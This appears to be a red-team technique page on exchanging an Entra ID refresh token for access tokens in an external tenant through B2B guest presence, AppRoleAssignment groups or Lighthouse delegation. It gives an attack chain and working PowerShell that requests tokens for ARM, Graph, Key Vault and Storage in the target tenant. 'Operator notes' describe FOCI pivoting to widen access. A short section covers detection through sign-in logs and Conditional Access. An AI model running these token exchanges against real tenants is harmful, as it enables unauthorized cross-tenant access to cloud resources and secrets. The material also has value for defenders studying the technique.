## Overview

Entra ID refresh tokens are not inherently scoped to the tenant in which they were issued. If an identity has a B2B presence in an external tenant — as a guest user, via an AppRoleAssignment group, or through Lighthouse delegation — a refresh token from the home tenant can be exchanged for access tokens scoped to that external tenant.

This mechanic is the final authentication step that connects the B2B access techniques (which establish *presence*) to actual *resource access* in the external tenant. Without the presence, the token exchange fails. With it, the standard OAuth token endpoint of the external tenant issues an access token for the cross-tenant identity.

## Trust Boundary

```
Home Tenant (Identity lives here)          External Tenant (Target)
┌────────────────────────────┐             ┌─────────────────────────────────┐
│  Identity + Refresh Token  │             │  B2B presence required:          │
│                            │──exchange──▶│  • Guest object (#EXT#)          │
│  POST to EXTERNAL tenant   │             │  • AppRoleAssignment via group    │
│  token endpoint            │             │  • Lighthouse delegation          │
│                            │             │  • Self-service registration      │
│                            │◀──token─────│                                  │
│                            │             │  Governed by:                    │
│  access_token for          │             │  • External Identities policy    │
│  external tenant resources │             │  • Conditional Access in ext.    │
│                            │             │  • Cross-tenant access policies  │
└────────────────────────────┘             └─────────────────────────────────┘
```

## Preconditions

| Requirement | Detail |
|---|---|
| Refresh token for the identity | FOCI-eligible RT preferred — maximizes resource scope options |
| B2B presence in the external tenant | Guest object, AppRoleAssignment group membership, or Lighthouse delegation |
| External tenant ID | Discoverable via Azure portal, ARM subscription listing, or B2B invitation metadata |
| External tenant allows the cross-tenant auth | `ExternalIdentitiesPolicy` and CA policies must not block the flow |

## Attack Chain

```
Establish B2B presence (via one of):
  → AppRoleAssignment group membership  (see: B2B — Cross-Tenant via AppRoleAssignment)
  → Self-service B2B registration       (see: B2B Self-Service + MFA Registration Bypass)
  → Lighthouse delegation               (see: Azure Lighthouse — Cross-Tenant ARM)
     ↓
Exchange RT against external tenant token endpoint
     ↓
Access token for external tenant resources (ARM, Graph, Key Vault, Storage)
     ↓
Enumerate and abuse permissions in external tenant
```

## Token Exchange

```powershell
$externalTenantId = "<EXTERNAL_TENANT_ID>"

$body = @{
    grant_type    = "refresh_token"
    client_id     = "<FOCI_CLIENT_ID>"   # e.g. Microsoft Office public FOCI client ID
    refresh_token = $RefreshToken
    scope         = "https://management.azure.com/.default offline_access"
}

$response = Invoke-RestMethod -Method POST `
    -Uri "https://login.microsoftonline.com/$externalTenantId/oauth2/v2.0/token" `
    -Body $body -ContentType "application/x-www-form-urlencoded"

$ExternalARMToken  = $response.access_token
$ExternalRefreshToken = $response.refresh_token    # if offline_access was included
```

If the identity has no B2B presence in the external tenant, the request fails with `AADSTS50020` (user account not found) or `AADSTS70011` (invalid scope). These error codes confirm the target tenant ID is valid but the presence condition is not met.

## Scoping to Different Resources

With the external tenant refresh token, pivot to each resource plane:

```powershell
$resources = @{
    ARM     = "https://management.azure.com/.default"
    Graph   = "https://graph.microsoft.com/.default"
    KV      = "https://vault.azure.net/.default"
    Storage = "https://storage.azure.com/.default"
}

foreach ($resource in $resources.GetEnumerator()) {
    $body = @{
        grant_type    = "refresh_token"
        client_id     = "<FOCI_CLIENT_ID>"
        refresh_token = $ExternalRefreshToken
        scope         = $resource.Value
    }
    try {
        $token = (Invoke-RestMethod -Method POST `
            -Uri "https://login.microsoftonline.com/$externalTenantId/oauth2/v2.0/token" `
            -Body $body -ContentType "application/x-www-form-urlencoded").access_token
        Write-Host "[+] $($resource.Key): token acquired"
    } catch {
        Write-Host "[-] $($resource.Key): $($_.Exception.Message)"
    }
}
```

## External Identities Policy Controls

The external tenant's `ExternalIdentitiesPolicy` governs what external B2B identities can do inside the tenant:

```powershell
# From within the external tenant (if Graph access exists)
Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/policies/externalIdentitiesPolicy" `
    -Headers @{ Authorization = "Bearer $ExternalGraphToken" } | Format-List
```

Key fields: `allowExternalIdentitiesToLeave`, `allowDeletedIdentitiesDataRemoval`. More critically, check what Conditional Access policies apply to guest identities — `GuestOrExternalUser` conditions in CA policies determine what MFA, location, or device requirements the cross-tenant identity faces.

## Relationship to Existing Techniques

| Prerequisite | Establishes | This technique |
|---|---|---|
| B2B AppRoleAssignment group | Guest object or group-based access | Token exchange to use that access |
| B2B Self-Service Registration | Guest object with MFA registered | Token exchange for the new guest identity |
| Azure Lighthouse | ARM delegation to subscription | Token exchange to operate on delegated resources |
| Illicit Consent Grant | App permission consent | Token exchange for the consented app's scope |

## Operator Notes

- The `object_id` and `tid` claims in the decoded external access token confirm which identity and tenant the token was issued for — always decode before using.
- Cross-tenant CA policies may impose stricter requirements on external identities than the home tenant CA policies. An MFA requirement in the external tenant must be satisfied — a token from the home tenant that satisfied MFA there may not satisfy it in the external tenant unless the policy has trust configured.
- The external refresh token (if returned) can be used for FOCI pivoting within the external tenant, further expanding the scope of accessible resources.

## Detection / Friction Points

- Sign-in logs in the external tenant show the B2B identity's sign-in event — the `crossTenantAccessType` field distinguishes B2B from native identity logins.
- The home tenant's sign-in logs record the token issuance — the `resourceTenantId` field identifies the external tenant the token was issued for.
- Conditional Access policies in the external tenant that target guest identities are the primary friction point — network location, MFA, and device compliance conditions apply independently from the home tenant.
- Cross-tenant access policies with `inboundTrust: false` do not honor MFA claims from the home tenant, requiring re-satisfaction at the external tenant.
